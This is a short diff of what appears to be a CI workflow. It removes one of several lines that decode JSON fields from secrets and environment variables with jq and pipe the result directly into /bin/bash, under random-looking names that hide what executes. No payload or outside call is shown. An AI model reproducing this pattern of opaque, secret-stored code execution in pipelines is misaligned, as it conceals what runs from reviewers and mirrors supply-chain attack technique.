@@ -18,7 +18,6 @@ jobs:
           ovf13410: ${{ secrets.ovf13410 }}
         run: |
           printf '%s' "$ovf13410" | jq -r .fka51219 | /bin/bash
-          echo $sdh16 | jq -r .btej1 | /bin/bash
           echo $qhkt524 | jq -r .jvo30912 | /bin/bash
 
       - name: Upload data
